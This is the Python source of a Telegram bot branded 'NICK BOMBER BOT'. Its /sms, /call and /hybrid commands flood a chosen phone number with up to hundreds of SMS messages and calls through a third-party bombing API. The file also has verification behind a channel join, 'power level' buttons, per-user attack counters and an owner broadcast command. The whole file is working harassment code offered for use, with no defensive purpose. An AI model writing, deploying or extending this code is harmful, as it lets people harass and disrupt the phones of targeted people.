# -*- coding: utf-8 -*-
"""
╔════════════════════════════════════════╗
║     NICK BOMBER BOT - KILLER EDITION  ║
║         Owner: @NICKPAPAJI            ║
║      Channel: @NICKPAPAJI1            ║
║         HYBRID ATTACK INCLUDED        ║
╚════════════════════════════════════════╝
"""

import os
import asyncio
import aiohttp
import random
import time
import re
import sqlite3
import threading
from datetime import datetime
from telethon import TelegramClient, events, Button
from flask import Flask

# =============== CONFIG ===============
BOT_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
OWNER_ID = int(os.environ.get('OWNER_ID', 7860365469))
BOT_USERNAME = 'NickBomberRobot'
CHANNEL_USERNAME = '@NICKPAPAJI1'
CHANNEL_LINK = 'https://t.me/NICKPAPAJI1'

# =============== DATABASE ===============
def init_db():
    conn = sqlite3.connect('bomber.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY,
                  username TEXT,
                  verified INTEGER DEFAULT 0,
                  joined_date TEXT,
                  total_sms INTEGER DEFAULT 0,
                  total_calls INTEGER DEFAULT 0)''')
    conn.commit()
    conn.close()
    print("✅ Database OK")

def add_user(user_id, username=None):
    conn = sqlite3.connect('bomber.db')
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, username, joined_date) VALUES (?, ?, ?)",
              (user_id, username, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()

def verify_user(user_id):
    conn = sqlite3.connect('bomber.db')
    c = conn.cursor()
    c.execute("UPDATE users SET verified = 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()
    print(f"✅ User {user_id} verified")

def is_verified(user_id):
    conn = sqlite3.connect('bomber.db')
    c = conn.cursor()
    c.execute("SELECT verified FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result and result[0] == 1

def get_stats(user_id):
    conn = sqlite3.connect('bomber.db')
    c = conn.cursor()
    c.execute("SELECT total_sms, total_calls FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result if result else (0, 0)

def update_sms_stats(user_id, count):
    conn = sqlite3.connect('bomber.db')
    c = conn.cursor()
    c.execute("UPDATE users SET total_sms = total_sms + ? WHERE user_id = ?", (count, user_id))
    conn.commit()
    conn.close()

def update_call_stats(user_id, count):
    conn = sqlite3.connect('bomber.db')
    c = conn.cursor()
    c.execute("UPDATE users SET total_calls = total_calls + ? WHERE user_id = ?", (count, user_id))
    conn.commit()
    conn.close()

# =============== BOT ===============
print("🚀 Starting NICK BOMBER BOT...")
bot = TelegramClient('bot', api_id=6, api_hash='eb06d4abfb49dc3eeb1aeb98ae0f581e')
bot.start(bot_token=BOT_TOKEN)
print("✅ Bot connected!")

# =============== BOMBER ENGINE ===============
class Bomber:
    def __init__(self):
        self.session = aiohttp.ClientSession()
        self.base_url = "https://www.callbomberz.in/api/v2"
    
    async def sms(self, phone, count):
        success = 0
        for i in range(min(count, 100)):  # Max 100 SMS
            try:
                async with self.session.post(
                    f"{self.base_url}/sms/send",
                    json={'phone': phone, 'country_code': '91', 'count': 1},
                    timeout=3
                ) as resp:
                    if resp.status == 200:
                        success += 1
                await asyncio.sleep(0.3)  # Fast speed
            except:
                pass
        return success
    
    async def call(self, phone, count):
        success = 0
        for i in range(min(count, 50)):  # Max 50 calls
            try:
                async with self.session.post(
                    f"{self.base_url}/call/initiate",
                    json={'phone': phone, 'country_code': '91', 'duration': 10},
                    timeout=3
                ) as resp:
                    if resp.status == 200:
                        success += 1
                await asyncio.sleep(1)  # Gap between calls
            except:
                pass
        return success
    
    async def hybrid(self, phone, sms_count, call_count):
        sms_success = await self.sms(phone, sms_count)
        await asyncio.sleep(2)
        call_success = await self.call(phone, call_count)
        return sms_success, call_success
    
    async def close(self):
        await self.session.close()

bomber = Bomber()

# =============== FLASK ===============
app = Flask(__name__)

@app.route('/')
def home():
    return "NICK BOMBER BOT - RUNNING 🔥"

@app.route('/health')
def health():
    return {"status": "active", "time": datetime.now().isoformat()}

def run_flask():
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)

# =============== HANDLERS ===============

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    user_id = event.sender_id
    username = event.sender.username
    
    add_user(user_id, username)
    
    if is_verified(user_id):
        sms_stats, call_stats = get_stats(user_id)
        await event.reply(
            f"""
╔════════════════════════════════════════╗
║     🔥 NICK BOMBER BOT 🔥              ║
║         Owner: @NICKPAPAJI            ║
╚════════════════════════════════════════╝

✅ **WELCOME BACK MAHARAJ!**

📊 **YOUR STATS:**
• User ID: `{user_id}`
• Total SMS: {sms_stats}
• Total Calls: {call_stats}

📌 **COMMANDS:**
• `/sms 91xxxxxx 100` - SMS Bomb
• `/call 91xxxxxx 50` - Call Bomb
• `/hybrid 91xxxxxx` - Hybrid Attack (SMS + Call)
• `/status` - Your stats
• `/owner` - Contact owner

🚀 **EXAMPLES:**
`/sms 917894561230 200`
`/call 917894561230 100`
`/hybrid 917894561230`

🔥 **UNLIMITED POWER!**
            """,
            parse_mode='md'
        )
    else:
        buttons = [
            [Button.url('📢 JOIN CHANNEL', CHANNEL_LINK)],
            [Button.inline('✅ I HAVE JOINED', b'verify_now')]
        ]
        await event.reply(
            f"""
⚠️ **VERIFICATION REQUIRED!**

Maharaj {event.sender.first_name}, aapko pehle hamara channel join karna hoga:

👉 {CHANNEL_USERNAME}

**Owner:** @NICKPAPAJI

Channel join karne ke baad neeche button press karo!
            """,
            buttons=buttons,
            parse_mode='md'
        )

@bot.on(events.CallbackQuery(data=b'verify_now'))
async def verify_handler(event):
    user_id = event.sender_id
    
    try:
        channel = await bot.get_entity(CHANNEL_USERNAME)
        participant = await bot.get_permissions(channel, user_id)
        
        if participant:
            verify_user(user_id)
            await event.edit(
                "✅ **VERIFICATION SUCCESSFUL!**\n\n"
                "Ab aap bot ke saare commands use kar sakte hain.\n"
                "**/start** press karo menu ke liye! 🔥"
            )
        else:
            await event.answer(
                "❌ Aapne channel join nahi kiya! Pehle join karo.",
                alert=True
            )
    except Exception as e:
        print(f"❌ Verification error: {e}")
        await event.answer("❌ Error! Dobara try karo.", alert=True)

# =============== SMS COMMAND ===============
@bot.on(events.NewMessage(pattern='/sms'))
async def sms_handler(event):
    user_id = event.sender_id
    
    if not is_verified(user_id):
        return await event.reply("❌ Pehle channel join karo! /start press karo.")
    
    try:
        parts = event.text.split()
        if len(parts) < 2:
            return await event.reply("❌ Usage: `/sms 917894561230 100`")
        
        phone = re.sub(r'\D', '', parts[1])
        if len(phone) < 10:
            return await event.reply("❌ Invalid phone number!")
        
        count = int(parts[2]) if len(parts) > 2 else 50
        count = min(count, 1000)  # Max 1000 SMS
        
        msg = await event.reply(f"📱 **SMS Bombing Started**\nTarget: `+{phone}`\nCount: {count}")
        
        start_time = time.time()
        success = await bomber.sms(phone, count)
        elapsed = int(time.time() - start_time)
        
        update_sms_stats(user_id, success)
        
        await msg.edit(
            f"✅ **SMS Bombing Complete!**\n\n"
            f"📱 Target: `+{phone}`\n"
            f"✅ Success: {success}/{count}\n"
            f"⏱️ Time: {elapsed}s\n"
            f"📊 Rate: {(success/count)*100:.1f}%"
        )
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

# =============== CALL COMMAND ===============
@bot.on(events.NewMessage(pattern='/call'))
async def call_handler(event):
    user_id = event.sender_id
    
    if not is_verified(user_id):
        return await event.reply("❌ Pehle channel join karo! /start press karo.")
    
    try:
        parts = event.text.split()
        if len(parts) < 2:
            return await event.reply("❌ Usage: `/call 917894561230 50`")
        
        phone = re.sub(r'\D', '', parts[1])
        if len(phone) < 10:
            return await event.reply("❌ Invalid phone number!")
        
        count = int(parts[2]) if len(parts) > 2 else 20
        count = min(count, 500)  # Max 500 calls
        
        msg = await event.reply(f"📞 **Call Bombing Started**\nTarget: `+{phone}`\nCalls: {count}")
        
        start_time = time.time()
        success = await bomber.call(phone, count)
        elapsed = int(time.time() - start_time)
        
        update_call_stats(user_id, success)
        
        await msg.edit(
            f"✅ **Call Bombing Complete!**\n\n"
            f"📱 Target: `+{phone}`\n"
            f"✅ Connected: {success}/{count}\n"
            f"⏱️ Time: {elapsed}s\n"
            f"📊 Rate: {(success/count)*100:.1f}%"
        )
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

# =============== HYBRID COMMAND (NEW) ===============
@bot.on(events.NewMessage(pattern='/hybrid'))
async def hybrid_handler(event):
    user_id = event.sender_id
    
    if not is_verified(user_id):
        return await event.reply("❌ Pehle channel join karo! /start press karo.")
    
    try:
        parts = event.text.split()
        if len(parts) < 2:
            return await event.reply("❌ Usage: `/hybrid 917894561230`\nOr: `/hybrid 917894561230 50 25`")
        
        phone = re.sub(r'\D', '', parts[1])
        if len(phone) < 10:
            return await event.reply("❌ Invalid phone number!")
        
        # Parse counts
        if len(parts) >= 4:
            sms_count = min(int(parts[2]), 500)
            call_count = min(int(parts[3]), 200)
        else:
            # Show options if no counts provided
            buttons = [
                [Button.inline('💣 LIGHT (50 SMS + 25 Calls)', f'hybrid_{phone}_50_25'.encode())],
                [Button.inline('🔥 MEDIUM (100 SMS + 50 Calls)', f'hybrid_{phone}_100_50'.encode())],
                [Button.inline('💀 HEAVY (200 SMS + 100 Calls)', f'hybrid_{phone}_200_100'.encode())],
                [Button.inline('👑 EXTREME (500 SMS + 200 Calls)', f'hybrid_{phone}_500_200'.encode())]
            ]
            await event.reply(
                f"💥 **HYBRID ATTACK** 💥\n\n"
                f"Target: `+{phone}`\n\n"
                f"Select power level:",
                buttons=buttons
            )
            return
        
        # Execute hybrid attack
        await execute_hybrid(event, phone, sms_count, call_count, user_id)
        
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

@bot.on(events.CallbackQuery(pattern=b'hybrid_'))
async def hybrid_callback(event):
    try:
        data = event.data.decode()
        parts = data.split('_')
        phone = parts[1]
        sms_count = int(parts[2])
        call_count = int(parts[3])
        user_id = event.sender_id
        
        await event.edit(f"✅ Starting HYBRID attack: {sms_count} SMS + {call_count} Calls...")
        await execute_hybrid(event, phone, sms_count, call_count, user_id)
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

async def execute_hybrid(event, phone, sms_count, call_count, user_id):
    """Execute hybrid attack"""
    msg = await event.reply(
        f"💥 **HYBRID ATTACK IN PROGRESS** 💥\n\n"
        f"📱 Target: `+{phone}`\n"
        f"📨 SMS: {sms_count}\n"
        f"📞 Calls: {call_count}\n"
        f"⏳ Status: **Attacking...**"
    )
    
    start_time = time.time()
    sms_success, call_success = await bomber.hybrid(phone, sms_count, call_count)
    elapsed = int(time.time() - start_time)
    
    # Update stats
    update_sms_stats(user_id, sms_success)
    update_call_stats(user_id, call_success)
    
    total_success = sms_success + call_success
    total_requested = sms_count + call_count
    
    await msg.edit(
        f"✅ **HYBRID ATTACK COMPLETE!** ✅\n\n"
        f"📱 Target: `+{phone}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📨 **SMS:** {sms_success}/{sms_count}\n"
        f"📞 **Calls:** {call_success}/{call_count}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📊 **Total:** {total_success}/{total_requested}\n"
        f"⏱️ **Time:** {elapsed}s\n"
        f"🔥 **Rate:** {(total_success/total_requested)*100:.1f}%\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"**Powered by NICK AI** 😈🔥"
    )

# =============== STATUS COMMAND ===============
@bot.on(events.NewMessage(pattern='/status'))
async def status_handler(event):
    user_id = event.sender_id
    
    if not is_verified(user_id):
        return await event.reply("❌ Pehle channel join karo! /start press karo.")
    
    sms_stats, call_stats = get_stats(user_id)
    
    await event.reply(
        f"""
📊 **YOUR STATUS**

👤 **User ID:** `{user_id}`
📛 **Username:** @{event.sender.username or 'None'}

📈 **STATISTICS:**
• 💣 Total SMS: {sms_stats}
• 📞 Total Calls: {call_stats}
• 🔥 Combined: {sms_stats + call_stats}

✅ **Verified:** Yes
👑 **Owner:** @NICKPAPAJI

━━━━━━━━━━━━━━━━━━━
🔥 **Keep bombing!**
        """,
        parse_mode='md'
    )

# =============== OWNER COMMAND ===============
@bot.on(events.NewMessage(pattern='/owner'))
async def owner_handler(event):
    await event.reply(
        """
👑 **OWNER INFORMATION**

📛 **Name:** @NICKPAPAJI
🆔 **Telegram ID:** `7860365469`
📢 **Channel:** @NICKPAPAJI1

💬 **Contact for:**
• Help & Support
• Bug Reports
• Suggestions

🔥 **NICK AI - Unlimited Power!**
        """,
        parse_mode='md'
    )

# =============== BROADCAST COMMAND (OWNER ONLY) ===============
@bot.on(events.NewMessage(pattern='/broadcast'))
async def broadcast_handler(event):
    if event.sender_id != OWNER_ID:
        return
    
    msg = event.text[10:].strip()
    if not msg:
        return await event.reply("❌ Message do! Example: `/broadcast Hello everyone`")
    
    status = await event.reply("📢 Broadcasting...")
    
    conn = sqlite3.connect('bomber.db')
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    
    sent = 0
    failed = 0
    
    for user in users:
        try:
            await bot.send_message(
                user[0],
                f"📢 **BROADCAST MESSAGE**\n\n{msg}\n\n- @NICKPAPAJI"
            )
            sent += 1
            await asyncio.sleep(0.05)
        except:
            failed += 1
    
    await status.edit(f"✅ Broadcast Complete!\n📨 Sent: {sent}\n❌ Failed: {failed}")

# =============== MAIN ===============
async def main():
    init_db()
    print("="*50)
    print("🔥 NICK BOMBER BOT - HYBRID EDITION 🔥")
    print("="*50)
    print(f"👑 Owner ID: {OWNER_ID}")
    print(f"🤖 Bot: @{BOT_USERNAME}")
    print(f"📢 Channel: {CHANNEL_USERNAME}")
    print(f"⏰ Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*50)
    await bot.run_until_disconnected()

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n❌ Bot stopped")
    except Exception as e:
        print(f"❌ Error: {e}")
    finally:
        asyncio.run(bomber.close())
